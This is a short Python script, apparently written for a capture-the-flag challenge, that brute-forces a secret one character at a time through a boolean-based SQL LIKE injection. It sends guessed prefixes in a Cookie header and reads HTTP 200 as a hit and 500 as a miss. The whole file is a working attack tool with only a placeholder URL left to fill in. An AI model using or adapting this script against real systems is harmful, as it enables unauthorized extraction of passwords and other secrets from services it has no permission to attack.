import sys
import time
import requests

# utility to brootforce a PW with a boolean result SQL `LIKE` injection
# you need to adjust `url` below
# and probably need to customize the requests call adding a body etc.

def tryPassword(pw):
	url = "<insert URL here>"
	headers = {
		"Cookie": pw
	}

	while True:
		r = requests.get(url, headers=headers)
		if r.status_code == 200:
			return True
		elif r.status_code == 500:
			return False
		elif r.status_code == 429:
			print("got 429 :(")
			time.sleep(3)
		else:
			print("got status code: ", r.status_code)

chars = [chr(ord('a') + c) for c in range(26)] \
	+ [chr(ord('0') + c) for c in range(10)] \
	+ ["_", "}"]

pw = ""
c = pw
while True:
	sys.stdout.write(c)
	sys.stdout.flush()
	for c in chars:
		if tryPassword(pw + c):
			#print("found", c)
			pw += c
			break
		c = None

	if c is None:
		print()
		print("FAIL :(")
		exit(0)
